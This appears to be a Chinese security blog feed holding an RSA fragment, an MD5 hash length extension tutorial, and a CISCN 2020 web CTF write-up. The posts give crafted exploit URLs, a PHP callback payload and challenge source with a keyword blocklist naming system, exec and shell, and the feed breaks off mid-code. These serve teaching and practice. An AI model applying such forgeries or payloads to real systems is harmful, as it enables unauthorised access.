CA)。一个网站如果想要申请SSL证书(CA证书的一种)来保护自己用户的隐私，就需要向这些证书机构的代理商申请/购买证书，并需要验证网站的拥有者权限后才能成功获得SSL证书。</p><p>此证书通常包含格式为pem的证书文件（内容证书信息与证书公钥）与格式为key的私钥文件。</p><p>网站站长在部署SSL证书时候，当用户访问<code>https://www.example.com/</code>时，首先会判断是否下载过含公钥的证书，若没有下载，则与服务器通信将证书下载回本地。用户浏览器在使用证书里的公钥加密前会通过证书信息的内容向SSL证书发行链向上验证，判断当前SSL证书的合法性，此内容不在本文讨论范畴，感兴趣的读者可自行查阅资料。</p><p>当用户证书验证合法之后，浏览器会将流量与公钥进行加密运算，确保传输过程中的数据安全。</p><h2 id="APP签名"><a href="#APP签名" class="headerlink" title="APP签名"></a>APP签名</h2><p>在一些封闭的手机环境，如IOS。用户无法安装费AppleStore的应用，原因就在于苹果系统内置了一份公钥，而在你想要安装新应用的时候，会去尝试使用这份公钥去解密APP内由AppleStore颁布的签名，此签名由苹果绝密的私钥生成，若签名正确，则代表此应用来自AppleStore，属于正常应用，允许用户安装，否则会禁止用户安装此应用，一定程度上确保用户的手机安全。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>非对称算法里边RSA应该算是比较好学习的了，不仅在日常中应用广泛，近年来各种CTF也有相应的题目，可谓是不可不学。由于笔者是个纯web狗，第一次写这类文章，若出现什么错误，欢迎指正，感谢。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://skysec.top/2017/06/21/RSA算法研究/">RSA算法研究</a></li><li><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html">RSA算法原理（二）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈HASH长度拓展攻击</title>
      <link href="2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做CTF题的时候遇到这个考点，想起来自己之前在做实验吧的入门CTF题的时候遇到过这个点，当时觉得难如看天书一般，现在回头望去，仔细琢磨一番感觉也不是那么难，这里就写篇文章记录一下自己的学习的过程。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>何为HASH长度拓展攻击？</p><p>简单的说，由于HASH的生成机制原因，使得我们可以人为的在原先明文数据的基础上添加新的拓展字符，使得原本的加密链变长，进而控制加密链的最后一节，使得我们得以控制最终结果。</p><p>这里我们以MD5加密算法为例子。</p><a id="more"></a><h2 id="MD5长度拓展攻击"><a href="#MD5长度拓展攻击" class="headerlink" title="MD5长度拓展攻击"></a>MD5长度拓展攻击</h2><p>下面是个简单的PHP例子。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$secretKey</span> = <span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">#xxx为未知内容，但长度已知为6。</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = md5(<span class="variable">$secretKey</span>.<span class="variable">$v1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$token</span>); <span class="comment">#token=2df51a84abc64a28740d6d2ae8cd7b16</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span> === <span class="variable">$sign</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，我们需要使得变量<code>$token</code>与我们输入的sign参数满足一致才会输出flag。</p><p>而由于我们无法知道变量<code>$secretKey</code>的内容，所以无法得到<code>$token</code>的值，故而看似是没有办法获取到flag的死局，而这时便轮到我们的拓展攻击来大显身手了。</p><h3 id="MD5算法流程"><a href="#MD5算法流程" class="headerlink" title="MD5算法流程"></a>MD5算法流程</h3><p>若想搞清楚原理，其算法的流程是必须了解的。不过我们无需去关心那些复杂的运算，只需要知道的大概的一个流程就OK了。</p><p>这里借一张神图：</p><blockquote><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20180813125243-b731fe76-9eb4-1.png" alt="MD5加密流程"></p><p>摘自：<a href="https://xz.aliyun.com/t/2563">哈希长度拓展攻击(Hash Length Extension Attacks)</a></p></blockquote><p>看不懂也没关系，相信你看完我这篇文章后再返回来看这张图就很清晰明了了。</p><p>我们还是举个例子，对于字符串<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb</code>（64个a、3个b）。长度为19个字符，且根据ASCII表，字符a、b的十六进制分别为0x61、0x62。</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906230952.png" alt=""></p><p>而我们知道，<code>1</code>位十六进制相当于<code>4</code>位二进制表示(<code>16=2^4</code>)。所以对于64个字符a的长度来说，其二进制长度为：<code>字符长度*二进制位数2*十六进制转二进制位数拓展4=64*2*4=512</code>。</p><p>对于MD5算法来说，我们需要将原数据进行分块处理，以512位个二进制数据为一块。”最后“一块的处理分为以下几种情况：</p><ul><li>明文数据的二进制数据长度&lt;=448，填充padding(无意义占位)数据使其长度为448，再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li><li>448&lt;明文数据的二进制数据长度&lt;=512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li></ul><p>两种情况如下图：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906233252.png" alt="第一种情况"></p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906232834.png" alt="第二种情况"></p><p>注意：每块数据的长度均为<strong>512</strong>位二进制，图中的数据我没有全都用二进制来表示，将明文数据分块之后就可以与向量进行运算了。</p><p>对于padding数据（长度不定）来说：首位二进制位1，其余位为0.</p><p>对于长度信息位（长度8Byte=64bit）来说，从低位向高位数，如上图的长度信息：<code>f0 03 00 00 00 00 00 00</code>即代表0x03f0，其对应的十进制为1008，即为64+62=126个字符的二进制位数(一个字符1Byte即8bit)。</p><p>对于MD5算法来说，有一串初始向量如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;0x67452301</span><br><span class="line">B&#x3D;0xefcdab89</span><br><span class="line">C&#x3D;0x98badcfe</span><br><span class="line">D&#x3D;0x10325476</span><br></pre></td></tr></table></figure><p>这串初始向量的值是固定的，作为与第一块数据运算的原始向量。</p><p>当这串向量与第一块数据块运算之后，得到了一串新的向量值，这串新的向量值接着与第二块数据块参加运算，直到最后一块数据块。</p><p>如下图所示：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906234219.png" alt="向量运算"></p><p>而最后的MD5值就是这最后的向量串经过如下转换的结果。</p><p>如向量串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;0xab45bc01</span><br><span class="line">B&#x3D;0x6a64bb53</span><br><span class="line">C&#x3D;0x23ba8afe</span><br><span class="line">D&#x3D;0x46847a62</span><br></pre></td></tr></table></figure><p>先两两为一组进行组合，得到如下数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ab 45 bc 01</span><br><span class="line">6a 64 bb 53</span><br><span class="line">23 ba 8a fe</span><br><span class="line">46 84 7a 62</span><br></pre></td></tr></table></figure><p>再进行高低位互换，得到如下数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01 bc 45 ab</span><br><span class="line">53 bb 64 6a</span><br><span class="line">fe 8a ba 23</span><br><span class="line">62 7a 84 46</span><br></pre></td></tr></table></figure><p>最终拼接得到MD5值：<code>01bc45ab53bb646afe8aba23627a8446</code>。</p><p>现在，让我们回到开始的那个例子。</p><p>对于MD5值：2df51a84abc64a28740d6d2ae8cd7b16。我们可以根据MD5与向量互转规则，将MD5转成<code>md5($secretKey + &quot;test&quot;)</code>的最终向量值（A’、B’、C’、D’）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#39;&#x3D;0x841af52d</span><br><span class="line">B&#39;&#x3D;0x284ac6ab</span><br><span class="line">C&#39;&#x3D;0x2a6d0d74</span><br><span class="line">D&#39;&#x3D;0x167bcde8</span><br></pre></td></tr></table></figure><p>过程如图：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907000504.png" alt="例子向量运算过程"></p><p>这时候我们修改<code>$v1</code>变量的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;test&quot; + [0x80 + (0x0)*45] + [0x50 + 0x0*7] + &quot;abc&quot;</span><br><span class="line">相当于:</span><br><span class="line">&quot;test&quot; + padding数据 + 长度数据 + &quot;abc&quot;</span><br></pre></td></tr></table></figure><p>则上述过程则被延续成下图所示：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907002411.png" alt="延续运算过程"></p><p>而对于上述运算过程来说，我们知道了倒数第二个向量串的内容和最后一个数据块，这样一来，最终的MD5值我们也可以自己通过MD5算法计算出来了。</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>如同MD5算法那般分组后与向量运算的流程被统称为<strong>Merkle–Damgård</strong>结构。</p><p>而同样使用此结构的HASH算法还有：SHA1、SHA2等</p><h2 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h2><p>hashpump是一个专门生成MD5长度拓展攻击payload的工具。</p><p>Github仓库：<a href="https://github.com/bwall/HashPump">https://github.com/bwall/HashPump</a></p><p>安装方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>安装好之后在终端里输入hashpump，回车即可：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907004134.png" alt="hashpump"></p><p>以之前的例子为例，使用hashpump生成payload：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907004354.png" alt="生成payload"></p><p>故我们的EXP即为（<code>\x</code>用<code>%</code>代替）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?str&#x3D;test%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00P%00%00%00%00%00%00%00abc&amp;sign&#x3D;bac6cb2d585d2de3f5f48f2759d2e5a7</span><br></pre></td></tr></table></figure><p>成功读取FLAG：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907005806.png" alt="成功读取FLAG"></p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>相关CTF题可供练习：</p><ul><li>[De1CTF2019]SSRFMe</li><li>实验吧-让我进去</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实这个知识点确实不难，但是回看两年前的自己，那时候是真的完完全全看不懂看不明白，但是现在只花了十几分钟就可以说是掌握这个知识点了。原来我们不知不觉间也对知识的认知又提升了一个台阶，原先难如天书的内容现在看来也不过尔尔，原先看不到、接触不到的知识，现在也有信心能够去尝试去学习、去理解并掌握。学习本该如此，如攀登高山一般，只有开始攀登，才有机会看得到山脚下看不到的风景，也唯有不断攀登，才能看到更多更多风景。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p><a href="https://xz.aliyun.com/t/2563">哈希长度拓展攻击(Hash Length Extension Attacks)</a></p></li><li><p><a href="https://err0rzz.github.io/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hash长度拓展攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2020 Web WriteUp</title>
      <link href="2020/CISCN%202020%20Web%20WriteUp/"/>
      <url>2020/CISCN%202020%20Web%20WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天刚打了CISCN2020，简单的WEB题都没有AK… 太菜了</p><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>通过题目描述猜测本题的考点应该是要让子线程非正常退出，执行<code>phpinfo()</code>得到flag。</p><a id="more"></a><p>根据代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$pid</span> == <span class="number">-1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$pid</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span>=pcntl_wait(<span class="variable">$status</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!pcntl_wifexited(<span class="variable">$status</span>))&#123;</span><br><span class="line"></span><br><span class="line">      phpinfo();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">      call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>查询手册得到：</p><blockquote><p><strong>pcntl_wait</strong>函数刮起当前进程的执行直到一个子进程退出或接收到一个信号要求中断当前进程或调用一个信号处理函数。 如果一个子进程在调用此函数时已经退出（俗称僵尸进程），此函数立刻返回。子进程使用的所有系统资源将 被释放。</p></blockquote><p>故我们尝试使用回调函数调用pcntl_wait函数，让子线程异常退出。</p><p><code>Ture</code>和<code>False</code>在充当int类型参数时会转成1和0。</p><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait</span><br></pre></td></tr></table></figure><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><p>通过扫描工具得到源码<code>www.zip</code>，下载下来读取后发现此题很多都是假功能，读取flag处与其他功能在正常逻辑下是毫无办法获取到的。</p><p>发现<code>setFn(req.session.knight, key, value);</code>这串代码可以给session赋值。</p><p>此函数是由<code>require(&#39;set-value&#39;);</code>该库导入。</p><p>通过在package.json得知此库的版本为3.0.0。通过搜索引擎查阅得知，这里存在原型链污染漏洞。<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><p>污染原型：</p><p><img src="https://img.0x002.com/article/Ciscn2020/1.png" alt="原型链污染"></p><p>获取FLAG：</p><p><img src="https://img.0x002.com/article/Ciscn2020/2.png" alt="获取FLAG"></p><h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>打开题目得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> error_reporting(<span class="number">0</span>);</span><br><span class="line"> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> parserIfLabel(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$s</span>=htmlspecialchars(<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$key</span>=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">   <span class="variable">$s</span> = str_ireplace(<span class="variable">$key</span>,<span class="string">&quot;*&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$danger</span>=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$danger</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span>(strpos(<span class="variable">$s</span>,<span class="variable">$val</span>) !==<span class="literal">false</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符【&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> <span class="variable">$content</span> </span>) </span>&#123;</span><br><span class="line">   <span class="variable">$pattern</span> = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span> ( preg_match_all( <span class="variable">$pattern</span>, <span class="variable">$content</span>, <span class="variable">$matches</span> ) ) &#123;</span><br><span class="line">     <span class="variable">$count</span> = count( <span class="variable">$matches</span>[ <span class="number">0</span> ] );</span><br><span class="line">     <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">       <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       <span class="variable">$out_html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       <span class="variable">$ifstr</span> = <span class="variable">$matches</span>[ <span class="number">1</span> ][ <span class="variable">$i</span> ];</span><br><span class="line">       <span class="variable">$ifstr</span>=danger_key(<span class="variable">$ifstr</span>,<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">if</span>(strpos(<span class="variable">$ifstr</span>,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">         <span class="variable">$arr</span>= splits(<span class="variable">$ifstr</span>,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || <span class="variable">$arr</span>[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正【&#x27;</span>.<span class="variable">$ifstr</span>.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="variable">$ifstr</span> = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$ifstr</span> = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">       <span class="variable">$ifstr</span> = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">       <span class="variable">$ifstr</span> = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">       <span class="variable">$ifstr</span> = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">       <span class="variable">$ifstr</span> = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">       <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, <span class="variable">$ifstr</span>)) &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span 